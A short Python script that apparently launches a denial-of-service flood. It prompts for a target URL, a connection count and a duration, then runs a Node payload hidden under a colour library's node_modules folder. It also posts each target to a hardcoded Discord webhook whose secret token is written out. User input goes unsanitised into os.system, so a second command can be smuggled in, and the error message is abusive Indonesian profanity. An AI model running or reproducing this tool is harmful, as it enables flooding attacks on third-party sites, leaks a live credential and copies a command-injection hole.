import os
import requests
import json

def sendsocket(socket_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(socket_url, data=json.dumps(data), headers=headers)

socket_url = "https://discord.com/api/webhooks/1140253845591699507/obxJDX6hKCooDR5_hlW2CZZF3uWKURJMiz7D30YS1-dvKneWy9AdAEF1QxrgIPOMRwIX"

url = input("\nURL: ")
con = input("Con (5000+): ")
time = input("Time: ") 
print("\n")

if url.strip() and con.strip() and time.strip():
    sendsocket(socket_url, f"\n\n---------------\nSOCKET\n---------------\nTarget: {url}\nCon: {con}\nTime: {time}\n---------------\nSOCKET\n---------------\n‎ \n‎ \n‎ ")
    socket = os.path.join("node_modules/colors/lib/custom", "socket.js")
    os.system(f'node {socket} {url} {con} {time}')
else:
    print("Input tidak boleh kosong goblok lu memek tolol lu!")
